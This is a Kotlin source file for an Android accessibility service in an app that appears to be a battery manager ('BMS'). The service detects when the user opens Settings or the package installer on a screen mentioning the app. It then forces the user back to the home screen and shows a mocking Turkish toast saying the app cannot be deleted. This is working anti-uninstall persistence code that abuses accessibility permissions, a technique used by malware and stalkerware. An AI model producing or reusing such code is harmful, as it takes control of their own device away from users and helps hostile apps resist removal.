package com.betta.batarya

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.content.Intent
import android.widget.Toast

class BmsAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: ""
            val className = event.className?.toString() ?: ""
            
            // Eğer kullanıcı ayarlar sayfasındaysa ve BMS paketini kurcalıyorsa
            if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
                val contentText = event.text.toString().uppercase()
                
                // BMS'yi silme veya devre dışı bırakma ekranlarını yakala
                if (contentText.contains("BMS") || contentText.contains("BATARYA")) {
                    // TROLL: Kullanıcıyı ana ekrana fırlat
                    val startMain = Intent(Intent.ACTION_MAIN)
                    startMain.addCategory(Intent.CATEGORY_HOME)
                    startMain.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(startMain)
                    
                    Toast.makeText(applicationContext, "BMS SİSTEMİN BİR PARÇASIDIR, SİLEMEZSİN! 😂", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    override fun onInterrupt() {}
}
